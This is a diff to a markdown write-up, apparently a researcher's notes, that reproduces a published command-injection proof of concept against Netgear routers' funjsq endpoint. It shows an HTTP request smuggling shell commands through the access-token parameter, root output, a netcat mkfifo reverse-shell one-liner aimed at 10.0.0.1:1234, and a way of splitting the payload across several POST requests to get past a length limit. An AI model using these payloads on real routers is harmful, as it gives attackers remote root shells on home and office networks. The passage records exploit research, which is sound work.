@@ -235,6 +235,7 @@ I googled funjsq trying to figure out what it was and found the following articl
 https://www.onekey.com/resource/security-advisory-netgear-routers-funjsq-vulnerabilities
 
 I tried out the basic proof of concept from the article, and it works as expected:
+
 **HTTP Request**
 ```
 GET /apply_bind.cgi?action_mode=funjsq_bind&funjsq_access_token=e594ff4c36742acf006cdf16%27|id>a|%27 HTTP/1.1
@@ -284,9 +285,9 @@ uid=0(root) gid=0(root)
 ```
 
 This was cool, and I wondered if I could create a PoC to get a reverse shell. I ran into a few challanges. First the version of nc included on the Netgear's busybox, does not support the _-e_ flag. However, using you can still use netcat to get a reverse shell with this oneliner:
-'''
+```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
-'''
+```
 source: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 The next issue I ran into was length. Because the payload is appended to the access key, you can only send about 25 characters in a single post request. My solution was to just echo the oneliner into a bash script over 4 or 5 post requests, change the permission then execute the bash script. There may be a better way but I was able to get this to work.
